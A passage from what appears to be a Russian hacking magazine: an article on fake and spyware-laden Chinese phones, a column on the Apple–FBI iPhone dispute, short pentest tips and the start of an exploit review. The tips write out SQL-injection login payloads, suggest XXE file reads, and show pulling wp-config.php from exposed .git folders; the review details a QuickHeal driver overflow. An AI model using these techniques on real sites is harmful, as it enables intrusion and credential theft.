лицензию у ее разработчика, компании Microsoft. А денежки платить не хо-
чется. Так и появляются устройства, аппаратно совместимые с картами
в формате SDXC, но не поддерживающие стандартную для них файловую
систему. Производители первого эшелона честно указывают соответствие
стандарту SDHC (карты памяти объемом до 32 Гб), а то, что пользователь
на свой страх и риск может отформатировать ее в FAT32 и успешно исполь-
зовать в таких устройствах, как бы бесплатный бонус. Только вот фильм
в HD на эту карту вряд ли зальешь; размер файла в FAT32 ограничен 4 Гб.

А ЕЩЕ БЫВАЮТ ПОДДЕЛКИ
Креативная подача спецификаций — это одно. А как насчет откровенных под-
делок? Клоны iPhone — само собой, их отличить, как правило, несложно, хоть
и удалось китайским умельцам собрать по крайней мере один аппарат, ра-
ботающий на самой настоящей iOS. А вот подделки «подвальных» произво-
дителей под другие китайские бренды — к примеру, Xiaomi или Lenovo, — уже
другое дело, куда неприятней.
   Вот, к примеру, как подделывают Lenovo. А вот и поддельные Xiaomi. А под-
дельные Samsung Galaxy всех мастей и разновидностей? Имя им — легион.
   Отличить подделки от оригинала может быть непросто. И если в самом
Китае такие подделки, как правило, подаются и продаются именно как клоны
известных устройств, то на онлайновых торговых площадках эта информация
нередко замалчивается. И даже по отзывам определить продавца, торгующе-
го подделками, бывает непросто: часть устройств (а то и вся первая партия)
может быть настоящей, а остальные — очень похожими на настоящие, обла-
дающими даже портированной прошивкой от оригинального производите-
ля. Вот только обновления почему-то не прилетают. И работает оно как-то «не
очень». И заявленные спецификации (число ядер, оперативная память) как-то
не соответствуют ощущениям от использования.
  А знаешь, что самое смешное? Для таких поддельных аппаратов еще и ка-
стомные прошивки делают! Вот, например, полюбуйся — прошивка «NEED
ROM for Alps FAKE Lenovo Vibe X2 TDD 16GB Black», «для поддельного Lenovo
Vibe X2». По-моему, прекрасно, просто прекрасно!





Подделка справа

ПРОШИВКИ С БЭКДОРОМ
Когда-то давно словосочетание «вирусная прошивка» могло напугать обыва-
телей и вызвать длительный здоровый смех у знающих людей. Сегодня все
обстоит с точностью до наоборот: обыватель расслабился, а специалисты,
напротив, сильно напряглись. Получить устройство из Китая с прошивкой,
в которую будет встроен один или несколько троянцев, ворующих данные и/
или демонстрирующих владельцу аппарата рекламу откровенного содержа-
ния, стало более чем реально.
   К примеру, смартфон InFocus M810T, полученный из магазина GearBest
по приятной цене — всего $150 за 5.5” экран с разрешением Full HD и процес-
сор Snapdragon 801 в обрамлении стекла и металла. Отличный аппарат, если
бы не одно «но»: в прошивке, с которой он приходит из магазина, установлено
два шпионских приложения. Причем оба этих троянца встроены в легитимные
приложения, загружаемые в память во время загрузки системы — телефон
и калькулятор.
InFocus M810T

Почему не обновить прошивку с официального сайта? Попробуй. В лучшем
случае обновление не установится. В худшем — получишь «кирпич». Именно
это и произошло с моим экземпляром. К счастью, удалось оживить.
  И снова: думаешь, это единичный случай? Отсылаю к статье 26 Android
Phone Models Shipped with Pre-Installed Spyware. Или вот: китайские планшеты
с предустановленными вирусами на Amazon.

И ДАЖЕ БЕЗ БЭКДОРОВ
Даже если телефон приехал без встроенных сомнительных «дополнений», во-
все не факт, что в нем установлена оригинальная прошивка. Возьмем, к приме-
ру, устройства производства Xiaomi. Неплохое «железо», качественные ориги-
нальные прошивки, хорошее соотношение цена/качество. Вот только далеко
не все модели компании предназначены для продажи за пределами Китая.
Не предназначены, но продаются.
   Для устройств, предназначенных для распространения исключитель-
но в Китае, и прошивки компания выпускает соответствующие — китайские.
Иногда вовсе без перевода на другие языки, даже на английский, но уж точно
без русского и без сервисов Google.
  Но сей факт не останавливает ушлых продавцов, прошивающих в такие
устройства… да неизвестно что прошивающих. Кем-то и как-то модифициро-
ванные прошивки с частичным переводом иероглифов и кое-как установлен-
ными сервисами Google. У этих прошивок, помимо общей сомнительности,
есть один глобальный недостаток: обновления «по воздуху» на них или не будут
прилетать совсем (это еще в лучшем случае), или, прилетев, превратят устрой-
ство в «кирпич». Так что снова в руки fastboot, custom recovery и прочие преле-
сти (к слову — может и не помочь, так как международные прошивки за автор-
ством производителя, повторюсь, бывают не для всех китайских устройств).
  А еще есть такая штука, как SalesTrack. Совсем недавний пример: Micromax
Bolt D303. Свежая, чистая, заводская прошивка телефона Micromax, предна-
значенного для продаж в Индии, отсылает SMS на индийский короткий номер
сразу после включении телефона. Так происходит активация устройства, вот
только пользователю, проживающему не в Индии, она влетит в копеечку.

ОПТИМИЗАЦИЯ. ИЛИ ЕЕ ОТСУТСТВИЕ
Чтобы операционная система работала более-менее плавно, нужны специ-
фические драйверы, уникальные для каждого устройства, и правильная на-
стройка всех компонентов прошивки — от ядра и до оболочки. К сожалению,
оптимизация — нечастый гость в китайских устройствах. Да, отдельные произ-
водители с небольшим модельным рядом (кивок в сторону Xiaomi, Meizu, Oppo
и OnePlus) могут себе позволить оптимизировать прошивку. Что же касается
полуподвальных и подвальных контор, штампующих по(д)делки и забывающих
о них через полгода после выхода, там будет лотерея. Если повезет, все будет
работать в большей или меньшей степени плавно и стабильно. Не повезет (как
в случае с описанным выше Ulefone Be Touch 2) — будет кошмар.
   Разумеется, проблемы с оптимизацией бывают у всех. Планшет Nexus 9, вы-
шедший с новой на тот момент версией Android 5.0, работал из рук вон плохо. Си-
туация частично исправилась только с выходом обновления 5.1.1, но полностью
раскрыл свой потенциал планшет лишь с выходом Android 6.0. Или флагман LG G
Flex 2, ставший первым устройством на платформе Snapdragon 810. Лаги и под-
тормаживания — были. И исчезли с выходом прошивки на версии Android 5.1.1.
А как обстоят дела с обновлениями прошивок у китайских производителей?

А ЕЩЕ БЫВАЮТ ОБНОВЛЕНИЯ. ИЛИ НЕ БЫВАЮТ
Послепродажная поддержка устройств с помощью обновления прошивки —
сложившаяся стандартная практика, принятая среди производителей перво-
го, да и второго эшелона. А вот подвальные поделки, как правило, обречены
работать с той прошивкой, которую установил на них производитель. В самом
лучшем случае ты получишь одно-два минорных обновления, исправляющих
найденные ошибки в рамках предустановленной ветки Android. Проще говоря,
если устройство пришло с Android 4.4 KitKat, обновление до 5.0 Lollipop тебе,
скорее всего, не светит.
  В чем причина? Разработка новой прошивки на основе свежей версии
Android, конечно, стоит денег. На послепродажном обслуживании получается
неплохо сэкономить, этим китайцы и знамениты.
  Но только ли в этом дело? К сожалению, нет. Очень и очень многие китай-
ские устройства оснащаются чипами производства китайского же концерна
MediaTek (MTK). Интегрированные решения производства MTK отличается
от аналогов, к примеру, американской Qualcomm, тем, что компания-произво-
дитель может выпустить драйвера к определенному набору системной логики
с поддержкой свежей версии Android — а может и не выпустить. Может пре-
доставить производителям смартфонов исходные коды — а может и не пре-
доставить. Отгадай с трех попыток, знаменита ли компания MTK поддержкой
своих чипов драйверами?
   Что касается таких производителей, как Allwinner и Rockchip, о какой-либо
поддержке, как правило, можно забыть сразу после получения устройства. Нет,
производитель может попытаться что-то сделать с обновлениями и без све-
жих версий драйверов, но…
  Не так давно автором сего текста был протестирован планшет на базе
чипа RK3188. Четыре ядра Cortex A9 — хороший вариант! Но планшет работал
не просто плохо, а из рук вон плохо. Даже прокрутка простой веб-страницы
осуществлялась с сильными задержками и рывками. Получение прав супер-
пользователя и тщательная оптимизация всего, что можно, не помогли. Объяс-
нение же оказалось очень простым: Rockchip выдал производителю планшета
драйверы для Android 4.2, а производитель захотел выпустить устройство под
управлением Android 4.4 KitKat. Выпустил. Лучше от этого не стало. Нужно ли
говорить, что обновлений прошивки с тех пор не было ни одной?
  И все бы выглядело логично, если бы не тот факт, что некоторые произ-
водители (тот же Meizu) успешно выпускают устройства на чипах MTK и столь
же успешно поддерживают их в течение длительного времени. Здесь, однако,
надо смотреть вглубь. Пристальное рассмотрение прошивок FlyMe OS пока-
зывает, что активное развитие прошивки идет в рамках какой-то определенной
ветки Android. Глобальный переход с Android 4 на 5-ю версию в рамках FlyMe
OS случился не так давно и с задержкой почти на год с момента выхода Android
Lollipop.

НЕТ, А ЧТО БРАТЬ-ТО?
Если уж мы все равно собрались заказывать что-то из онлайнового магази-
на, давайте развернемся на 180 градусов и вместо востока посмотрим на за-
пад. Хотя бы на такие торговые площадки, как eBay и Amazon. И с удивлением
обнаружим, что флагманы прошлого сезона распродаются за половину, а то
и за треть цены в сравнении с моментом анонса. Что же можно присмотреть
за свои деньги — и не из Китая?
LG G Flex 2

К примеру, за $188 (без учета стоимости доставки) на eBay предлагается совер-
шенно новый, не привязанный к оператору LG G Flex 2 на платформе Qualcomm
Snapdragon 810. Уникальная «фишка» устройства — изогнутый экран Full HD,
выполненный по технологии P-OLED. За эти деньги можно взять версию с 32GB
ROM/2GB RAM или 16GB ROM/3GB RAM. А если хочется европейских частот
LTE? Тогда смотрим в сторону немецких магазинов, которые с удовольствием
доставят товар в Россию — и вычтут при этом из цены устройства 19% немец-
кого налога с продаж. В этом случае мы получим европейскую версию Flex 2
за цену порядка 220 евро. (Правда, в европейской версии, в отличие от аме-
риканской, ты получишь всего 16 ГБ постоянной и 2 ГБ оперативной памяти —
против 32 ГБ и 3 ГБ в более дешевых американских модификациях).
  Не нравится «гнутый» экран, «греющийся 810-й дракон» или прошивка LG
(кстати, на нее в скором времени должен «прилететь» Android 6.0)? Посмотри
в сторону прошлогоднего флагмана — Nexus 6 производства Motorola. Аме-
риканская версия доступна за $299, что вовсе не чрезмерно за аппарат, обо-
рудованный чипом Qualcomm Snapdragon 805 и «нафаршированный» всеми
возможными «фишками» от беспроводной зарядки до камеры с оптической
стабилизацией.
  Не нравится шестидюймовый экран? Motorola Moto X (версия 2014 года)
с экраном 5.2” продается (а точнее, распродается) за $199 в США или 189 евро
в Германии.
Amazon Fire Phone

Хочется дешевле? Поищи на eBay. Новенький Amazon Fire Phone с экраном
4.7”, оборудованный 32 ГБ ROM, камерой с оптической стабилизацией и про-
цессором Qualcomm Snapdragon 800 обойдется в жалкие $130 — и при этом
прямо из коробки ты получишь поддержку всех возможных частот 3G и LTE,
какие только бывают в США и Европе.
  А если посмотреть чуть шире, то за $101 как с американского Амазона, так
и с Aliexpress можно заказать бывший флагман на Windows Phone — Nokia Lumia
928 (Verizon), обладающий 32ГБ встроенной памяти, великолепной камерой
с оптическим стабилизатором, экраном AMOLED и двухъядерным Snapdragon
S4. И, кстати, устройство до сих пор поддерживается прошивками и должно
обновиться на Windows 10. К сведению: телефоны Verizon с поддержкой LTE
идут без привязки к оператору (никакой код для их разблокирования не ну-
жен), но вот сам LTE за пределами США работать не будет: только 3G/HSPA.
   Хочется что-то посовременнее и еще дешевле? За $59 можно заказать AT&T
Microsoft Lumia 640, который совершенно бесплатно отвязывается от опера-
тора на сайте AT&T.
Nokia Lumia 928                                 Micosoft Lumia 640

А ЕСЛИ ВСЕ-ТАКИ КИТАЙ?
Если непременно нужен именно                                       OnePlus
китайский и никакой иной аппа-                                   One
рат, но не очень хочется словить
троянца или попасть на деньги из-
за того, что телефон будет слать
текстовые сообщения на платные
номера, посмотри на аппараты,
которые производители офици-
ально продают на международ-
ном рынке.
  В первую очередь к таковым
производителям относится ком-
пания OnePlus со своими OnePlus
One и OnePlus Two. Если покупать
не у сомнительных перепродав-
цов, не с Aliexpress и не в китай-
ских магазинах (которые с макси-
мальной наценкой продадут тебе
версию  телефона,  предназна-
ченную для локального китайско-
го рынка)… так вот, если покупать напря-
мую в официальном магазине OnePlus,
то за цену Motorola Moto X (2014) ты по-
лучишь OnePlus One, устройство преды-
дущего модельного года с официаль-
ной поддержкой CyanogenMod (правда,
не имеющее поддержки 20-й полосы LTE
(800 МГц)).
  А за полторы цены LG G Flex 2 (напом-
ню, это аппарат на Snapdragon 810) или
приблизительно за цену Motorola Nexus 6
(устройство 2014 года) ты сможешь стать
счастливым владельцем OnePlus Two, сба-
лансированного устройства с поддержкой
LTE Band 20. Экономия? Нет, но в данном
случае аппарат интересен сам по себе, да
и не придется искать хорошее предложе-
ние на eBay, заходи и покупай.                  Xiaomi Mi5





Meizu MX5
   Также обрати внимание на теле-
фоны Oppo — материнской компании
OnePlus, предлагающей  смартфо-
ны по «взрослым» ценам и имеющей
официальные магазины и поддерж-
ку за пределами Китая. Сэкономить
здесь не удастся, зато ты получишь
отличное качество сборки, приятный
внешний вид, качественные компо-
ненты и — редкость среди китайских
производителей! — поддержку 20-й
полосы LTE.
  Про Xiaomi мы уже говорили: ком-
пания  выходит-выходит,  да  никак
не выйдет на международный рынок,
в результате чего официальные меж-
дународные прошивки существуют
только для относительно слабень-
кого Mi4i, основанного на неудачном
Snapdragon 615 и так и не получивше-   ZUK Z1
го поддержку 20-й полосы LTE. Впро-
чем, выбор за тобой.
   Удачный выбор — аппараты производства Meizu. Нет, поддержки европей-
ской 20-й полосы LTE ты не увидишь и здесь, однако красивый внешний вид,
качественные компоненты и наличие официальных международных каналов
продаж делают покупку этих устройств осмысленной.
   Lenovo вышла на международный рынок с новой линейкой ZUK. Аппарат
ZUK Z1 выполнен на уровне позапрошлогодних флагманов, а стоит как флаг-
маны прошлогодние. Экономическая целесообразность покупки, однако, со-
мнительна.

ВЫВОДЫ
Покупка китайского смартфона или планшета — лотерея. Покупка оного устрой-
ства в китайском онлайновом магазине — лотерея вдвойне. Да, есть шанс сэ-
кономить заметную сумму. Но есть шанс получить устройство, лишь условно
работоспособное. Неисправимые (и не исправляемые производителем) ошиб-
ки, приводящие к дискомфорту во время эксплуатации, использование деше-
вых компонентов, выходящих из строя в самый неудачный момент, фактическое
отсутствие гарантии и поддержки — вполне вероятный сценарий. Всегда оста-
ется шанс получить «вирусную» прошивку, замена (или простое удаление виру-
сов) которой приведет к отказу продавца от гарантийных обязательств.
   Если же брать устройства известных компаний (таких как Oppo, Meizu,
OnePlus) у их официальных международных дилеров, то о сколь-либо суще-
ственной экономии говорить не приходится. Эти устройства покупаются ско-
рее из-за того, что интересны сами по себе. Но будут ли они обладать лучшим
соотношением цена/качество в сравнении с прошлогодними флагманами
А-брендов? Совсем не факт.
MOBILE: Колонка Евгения Зобнина
ТЕРАКТ, APPLE, FBI,
 ПИАР И СОВЕСТЬ





                      Евгений Зобнин
                                      androidstreet.net



16 февраля глава Apple Тим Кук опубликовал открытое пись-
мо, в котором обвинил ФБР в том, что они под предлогом
борьбы с терроризмом хотят получить «ключ» от всех суще-
ствующих айфонов и таким образом поставить конфиден-
циальность личных данных миллионов человек под угрозу.
Письмо быстро было растиражировано СМИ, многие из ко-
торых начали строить свои версии произошедшего, даже
не удосужившись разобраться в проблеме. А если это сде-
лать, то окажется, что ФБР вовсе не просило Apple встроить
бэкдор в iOS и даже не просило создать уязвимую версию
системы специально для него, а Тим Кук очень преувеличил,
заявив про «отмычку от сотен миллионов дверей».
ЧТО СЛУЧИЛОСЬ
2 декабря 2015 года в 11 часов утра в здание центра для людей с ограничен-
ными возможностями города Сан-Бернардино ворвались Сайед Ризван Фа-
рук и Ташфин Малик и открыли стрельбу по безоружным, убив четырнадцать
человек и ранив больше двадцати. Спустя четыре часа сотрудники полиции
обнаружили подозреваемых и в перестрелке убили обоих. В ходе расследо-
вания был найден iPhone 5c одного из нападавших.
   Рассчитывая добыть дополнительные сведения для расследования причин
теракта и его возможных заказчиков, ФБР получило доступ к iCloud-бэкапу
смартфона. Однако оказалось, что последний бэкап был сделан 19 октября,
то есть почти за полтора месяца до теракта. Разумно рассудив, что владелец
просто отключил функцию бэкапа, чтобы информация не сливалась в Сеть,
сотрудники ФБР попытались добраться до данных самого смартфона. К не-
счастью, он оказался залочен со всеми вытекающими отсюда «вкусностями»
в виде шифрования данных, десяти попыток на ввод PIN-кода и задержки меж-
ду попытками.
   Отчаявшись, ФБР заручилось поддержкой федерального судьи и обрати-
лось к Apple.

ЧТО ФБР ПОТРЕБОВАЛО У APPLE
Версия СМИ. Специальную версию iOS со встроенным бэкдором.
Версия Apple. «Отмычку от сотен миллионов дверей».
На самом деле. Согласно копии оригинального ордера (pdf) ФБР нуж-
на вовсе не iOS с бэкдором, а подписанный цифровым ключом Apple образ
со специальным RAM-диском, который, загруженный на смартфоне через ре-
жим DFU, сделает следующее:
•  отключит функцию сброса до заводских настроек после десяти неудачных
попыток ввода PIN-кода;
•  отключит задержку между попытками ввода PIN-кода;
•  позволит производить попытки ввода PIN-кода программно, используя
подключение по USB, Wi-Fi или Bluetooth.

Говоря простыми словами, ФБР попросило Apple создать нечто вроде «диска
восстановления Windows», который сам никуда не устанавливается, но при этом
позволяет выполнить нужные функции. Более того, в ордере есть прямое ука-
зание на то, что образ должен работать только на конкретном смартфоне (про-
верив уникальный ID девайса), а если Apple не хочет по тем или иным причи-
нам предоставлять его ФБР, то ФБР готовы отдать iPhone самой Apple, чтобы
ее сотрудники смогли загрузить на смартфоне указанный RAM-диск, а затем
обеспечили доступ к ПК, к которому подключен девайс.
   Говоря еще более простым языком, все, что попросили ФБР, — это дать им
возможность поломать PIN-код смартфона и скопировать с него данные пря-
мо в офисе Apple, не требуя никакого кода и уж тем более встраивания бэкдо-
ра в iOS.

ПОЧЕМУ APPLE ОТКАЗАЛА
Версия СМИ. Компания воспользовалась ситуацией, чтобы попиариться.
Версия Apple. Забота о личных данных юзеров.
На самом деле. Говорить стоит вовсе не о пиаре, а о сохранении лица. В по-
следние годы Apple активно продвигает себя как компанию, очень бережно
относящуюся к личным данным юзеров. Об этом они говорят в презентаци-
ях, анонсах, пресс-релизах и неустанно заявляют, что сами не могут получить
доступ к пользовательским данным. Во многом это их хлеб, так как есть до-
вольно большой рынок корпоративных клиентов, которые перешли на Apple
после фактической смерти BlackBerry. И чтобы сохранить эту репутацию, Тим
Кук готов зайти очень далеко, включая публичное нарушение прямого предпи-
сания суда.
  Может показаться, что сделать инструмент для брутфорса одного-един-
ственного смартфона, да к тому же принадлежавшего убийце инвалидов, —
это даже благородно и к тому же не нарушает ничью конфиденциальность.
Но есть такое слово — прецедент. Единожды пойдя на уступки ФБР, Apple
как бы подтвердит: «Да, мы можем создать инструмент для взлома чужих
смартфонов, если на нас надавить», и в своем обращении Тим Кук абсолют-
но верно подметил, что существует вполне реальная вероятность, что пра-
вительство пойдет еще дальше и в следующий раз действительно попросит
встроить бэкдор в iOS, а затем и функцию прослушивания звонков. И все это
опять же в благих целях.
  За примерами далеко ходить не надо. Все мы помним, как родилась идея
блокировки российских сайтов без суда и следствия. Очень благая цель —
борьба с детской порнографией, которая якобы появляется и исчезает в Сети
так быстро, что к моменту, когда суд вынесет решение, чайлдпорносайт уже
будет закрыт и появится в другом месте. К чему привела такая якобы хорошая
инициатива, ты и сам знаешь.
ПОЧЕМУ ФБР НЕ СДЕЛАЕТ ДАМП ПАМЯТИ УСТРОЙСТВА
И НЕ ВЫПОЛНИТ БРУТФОРС НА ПК
Версия анонимуса. Они слишком тупые.
На самом деле. Это было бы легко, если бы ключ шифрования (зашифро-
ванный PIN-кодом) хранился в самой NAND-памяти устройства, как это сде-
лано в дешевых и устаревших Android-смартфонах без криптомодуля и под-
держки TrustZone. Однако в iPhone 5c ключ шифрования (256-bit AES) хранится
в выделенном модуле памяти, получить доступ к которому в обход iOS очень
и очень сложно.
   Фактически самый действенный метод прочитать данные с такого чипа —
это просветить его рентгеном, и даже есть фирмы, которые занимаются этим
за денежку. Причин, по которым ФБР до сих пор этого не сделало, очевидно,
две: 1) они пошли самым простым путем; 2) они действительно хотят создать
прецедент, прикрывшись благородными целями.

ВМЕСТО ЗАКЛЮЧЕНИЯ
Как видишь, ситуация далеко не такая однозначная, какой ее пытается препод-
нести Тим Кук и остальные вступившиеся за него люди. Однако, даже раскопав
суть проблемы, я предпочитаю оставаться на стороне Apple. И дело тут вовсе
не в том, что я считаю конфиденциальность выше всего на свете, а в банальной
логике. Зная, что ФБР легко вскрывает смартфоны, террористы и прочие пре-
ступные элементы просто перестанут их использовать и перейдут либо на од-
норазовые звонилки, либо на сторонние средства шифрования. В результате
ситуация не изменится вообще никак, зато у правительства США будет козырь
в рукаве.
Взлом
EASY
HACK



                      WARNING

                                      Вся информация
                                  предоставлена исключительно
                                      в ознакомительных целях.
                                   Лица, использующие данную
                             информацию в противозаконных
                                      целях, могут быть привлечены
                                             к ответственности.
             Дмитрий Бумов, ONSEC,
                @i_bo0om, bo0om.ru



ПРОПИХИВАЕМ ИНЪЕКЦИЮ
ЧЕРЕЗ JSON/XML-ЗАГЛУШКИ ДЛЯ API
Как найти уязвимости там, где их ещё никто не искал? Попробуй перевести
POST-запрос (например, для аутентификации) в JSON- или XML-формат. Идея
в том, что разработчики часто оставляют различные способы аутентифика-
ции — обычно, для дальнейшего использования сторонними приложениями.
Так как эта функциональность не на виду, часто она не защищена от банальных
инъекций. А если в дело вступает XML — возможность чтения произвольных
файлов на сервере практически гарантирована!
   Смотри, вот стандартный вход на сайт:

POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
...
username=demologin&password=demopass

Переведем все параметры в json-формат:

POST /login HTTP/1.1
Content-Type: application/json
...
{ "username": "demologin", "password": "demopass" }

Если аутентификация произошла — попробуем сделать из этого инъекцию:

POST /login HTTP/1.1
Content-Type: application/json
...
{ "username": "demologin’ OR 1=1--", "password": "demopass" }

Не забывай, что это JSON, и чтобы не нарушить его структуру, вектор вида
" OR "a"="a необходимо отправлять с экранированными кавычками:
\" OR \"a\"=\"a.
   Точно так же можно попробовать перевести параметры в XML. Главное —
не забыть про Content-type, многие веб-приложения не захотят парсить XML
без него:

POST /login HTTP/1.1
Content-Type: application/xml
...
<?xml version="1.0" ?>
<username>demologin<username>
<password>demopass</password>

Всё получилось? Пробуй XXE — и возможно, у тебя в руках чтение произволь-
ных файлов на сервере! Круто, правда?





                 aLLy, ONSEC,
                  @iamsecurity



ИЩЕМ ФАЙЛЫ В НЕЗАКРЫТЫХ GIT-РЕПОЗИТОРЯХ
Во время тестирования на проникновение встречаются git репозитории, к ко-
торым авторы «забыли» закрыть доступ. Это очень полезный улов, особенно
при тестировании «черным ящиком».
  Обычно я пытаюсь скачать все доступные файлы репозитория с помощью
dvcs-ripper или DVCS-Pillage, чтобы затем восстановить исходники проекта. Од-
нако это не всегда хорошая идея. Во-первых, это спровоцирует кучу запросов
к серверу пропорционально количеству файлов в репозитории; такими дей-
ствиями немудрено разбудить какой-нибудь мирно спящий WAF. Во-вторых, все
иcходники не всегда бывают нужны. Если это какой-нибудь паблик фреймворк
или CMS (Wordpress, Bitrix, Kohana, etc), зачем нам тянуть их ядро? Правильно,
абсолютно незачем, нам нужны лишь несколько конфигов и файлы классов.
   Устав от того, что каждый раз приходится выполнять рутинные действия
по вытаскиванию определенных файлов, я написал pwngitmanager. С его помо-
щью можно посмотреть, что есть в репозитории, найти нужные файлы и ска-
чать их.
   Допустим, у нас есть небезызвестный example.com, на котором не закрыт
доступ к файлам из папки .git. Чтобы посмотреть содержимое репозитория,
достаточно просто выполнить ls:
python3 pwngit.py
> use example.com
> ls





Запуск и листинг файлов в репозитории

А чтобы показать файл, нужно выполнить get:

> get wp-config.php





Получение содержимого файла

При этом содержимое выводится в окно консоли, а сам файл сохраняется
в папку с именем репозитория для дальнейшего использования. Можно ис-
кать и по имени файла. Например, нам нужно найти все sql-файлы:
> find *.sql





Поиск файлов в репозитории

Если нужно найти файлы в папке с конкретным именем, можно воспользовать-
ся поиском по пути:

> search private

Утилита поддерживает удобное автодополнение путей по TAB, как и обычная
консоль.
   Скрипт будет дополняться новыми фичами, а найденные ошибки — опера-
тивно исправляться.





             Дмитрий Бумов, ONSEC,
                @i_bo0om, bo0om.ru



ФАЗЗИМ ВЕБ-ПРИЛОЖЕНИЕ НА ОТКРЫТЫЕ ДИРЕКТОРИИ
Часто случается так, что на сайте существует sensitive-ресурс, явно неприкры-
тый для доступа извне, и к нему можно спокойно получить доступ обычным
CURL’ом. Это может быть админка, git-репозиторий, конфиг, fixtures, потенци-
ально уязвимые файлы и много чего другого. Например, установив какую-ни-
будь CMS, владелец сайта забывает удалить инсталл-директории и выпускает
сайт в продакшн. Несмотря на то, что большинство современных движков явно
указывают на миссконфиг, такие ошибки по-прежнему встречаются, и из от-
крытых директорий можно выудить кучу полезной инфы: от информации о при-
ложении и версии плагинов до технических данных и реально существующих
логинов. Важно лишь знать, что искать.
   Чтобы быстро пофаззить сайт на открытую sensitive-информацию, нам по-
надобится сам фаззер и списки фаззинга. В качестве второго предлагаю вос-
пользоваться моим репозиторием (txt), в котором я собираю популярные ди-
ректории, файлы, остатки конфигов пакетных менеджеров — в общем, все, что
может представлять интерес на этапе разведки. В качестве самого фаззера
могу порекомендовать тебе три инструмента: dirsearch, wfuzz и dirbuster.

DIRBUSTER (КЛАССИКА)





sourceforge.net/projects/dirbuster/
Платформа: Win/OS X/Linux, требует Java

ПЛЮСЫ
++ Классика, проверенная временем
++ Имеет GUI
++ Большие встроенные словари
++ Автоматически определяет, использовать ли HEAD-запросы
   (значительно ускоряет скорость брута)
++ Режим рекурсивного брута с возможностью отключения выбранных ди-
   ректорий и управлением потоками «на лету»
++ Умеет парсить ссылки из уже найденных страниц

МИНУСЫ
–– Не сопровождается, заброшен аж с 2009 года
–– Не сохраняет результаты, если ты сам этого не сделаешь
DIRSEARCH (БЫВШИЙ DIRS3ARCH)





github.com/maurosoria/dirsearch
Платформа: Win/OS X/Linux, требует Python 3

ПЛЮСЫ
++ Поддерживает отправку случайного User-agent’а
++ Умеет работать с списком сайтов
++ Подгружает настройки из конфига
++ Очень простой в использовании

МИНУСЫ
–– Нет множества нужных фич


WFUZZ (КОМБАЙН ДЛЯ ДИРБАСТА)





github.com/xmendez/wfuzz
Платформа: Win/OS X/Linux, требует Python 2

ПЛЮСЫ
++ Поддержка плагинов
++ Работа с множеством словарей
++ Перебор заголовков и cookie
++ Умеет работать с использованием списка прокси
МИНУСЫ
–– Сложен в настройке
–– Часто падает с ошибками и вообще нестабилен

Выбирай любой! Для dirsearch я оставил одноименный словарь, так как ис-
пользую его постоянно: уж больно мне нравится возможность брутить сразу
целый список хостов. Wfuzz ловок, гибок и силён: помимо брута может прове-
рить на простейшие инъекции или найти XSS. А dirbuster позволит наблюдать
и полностью контролировать процесс поиска непролинкованых директорий,
да и словари в комплекте — бесценны.
Взлом1111





                                                                                  Борис
                                                                                     "dukeBarman"
                                                                                       Рютин,
                                                                                         DSec
     WARNING                                                                                                                b.ryutin@tzor.ru
                                                                                       @dukebarman
                                                                                                dukebarman.pro
       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
     Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
      материалами данной
             статьи.

ОБЗОР
ЭКСПЛОЙТОВ
  АНАЛИЗ СВЕЖИХ УЯЗВИМОСТЕЙ
  В сегодняшнем обзоре мы рассмотрим DoS уязвимость в антивирусе QuickHeal,
 посмотрим, как происходит процесс поиска и эксплуатации ошибки в браузере Baidu
  для Android, и закончим взгядом на серию уязвимостей в популярной веб-камере.

DOS УЯЗВИМОСТЬ В ДРАЙВЕРЕ WEBSSX.SYS
ОТ QUICKHEAL
 CVSSv2      N/A
 Дата релиза: 19 февраля 2016 года
 Автор:       Csaba Fitzl
 CVE:         2015-8285

В антивирусе QuickHeal 16.00 (9.0.0.x) была обнаружена DoS-уязвимость, ко-
торая может привести к повышению привилегий. Уязвимый драйвер можно
найти по следующему пути:

C:\Program Files\Quick Heal\Quick Heal Internet Security\webssx.sys

Если мы посмотрим его характеристики с помощью программы DeviceTree, то
увидим, что, хоть она и должна быть доступна только администраторам или
пользователю SYSTEM, флаг DEVICE_SECURE_OPEN не используется. Это озна-
чает, что любой пользователь может взаимодействовать с этим драйвером
и произвольным путем к нему. Выглядеть он будет примерно так: \Device\
webssx\sometext.





Свойства драйвера webssx в DeviceTree
Граф вызовов уязвимой функции драйвера webssx
Далее автор нашел IOCTL код 0x830020FC, приводящий к вызову уязвимой
функции. Но для того, чтобы попасть к ней, нужно, чтобы размер входяще-
го буфера был больше, чем 0x138. Если условие выполняется, то по адресу
webssx+5596, произойдет вызов sub_1D1E, который затем вызовет функцию
webssx+1090. Граф вызовов представлен на скриншоте (на предыдущей стра-
нице).
   Целочисленное переполнение получается из-за недостаточной проверки
получаемых данных из входного буфера. На скриншоте ты можешь видеть,
что если мы имеем 0x1 в определенном месте буфера, то случится переход
на небольшой участок кода, который установит новое значение регистра EDX.
Данные берутся из буфера и к ним добавляется 0x14A.





Затем EDX используется для выделения пула в пространстве ядра. Если мы
установим значение по смещению 0x130 в буфере на 0xffffffc0 или нечто
похожее, то значение в EDX будет меньше, чем 0x14A. Затем оно использует-
ся для задания размера пула.
   Если выделение пройдет успешно, то мы увидим, что будет скопировано
0x4E*4 = 0x138 байт внутрь пула из буфера. В случае повреждения размера
выделения произойдет перезапись пула ядра, что, в свою очередь, приведет
к повышению привилегий.
Перезапись пула ядра после переполнения в webssx


Когда функция продолжит работу, те же проверки будут снова выполнены,
и мы обратимся к операции memcpy. Первоначальная задумка разработчиков,
наверное, выглядела примерно так:





Операция memcpy вызовет BSOD (потому что размер параметра будет намно-
го больше — 0xffffffc0, что примерно равно 4 ГБ) и может упасть в следу-
ющих случаях:
1. наш ввод меньше 4 ГБ и попытается прочесть из памяти адреса, которые
   не инициализированы;
2. на 32-битном компьютере у нас закончится память во время копирования.
Вызов операции memcpy в webssx

EXPLOIT
Автор опубликовал на GitHub свой эксплойт для демонстрации уязвимости. Он
написан на Python и для работы требует ctypes, чтобы обратиться к kernel32
и ntdll:




Обратимся к кастомному обработчику ядра \\\\.\\webssx\some с нужными
параметрами:
Выделим память:





И отправляем ioctl-вызов:
Аналогичная уязвимость существует и на 64-битных системах, но так как опе-
ративной памяти больше, то, по словам автора, возможен не только DoS, но и
поднятие привилегий.

TARGETS
QuickHeal 16.00 (9.0.0.x)

SOLUTION
Производитель выпустил исправление.


УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОДА В BAIDU
BROWSER ДЛЯ ANDROID
 CVSSv2      N/A
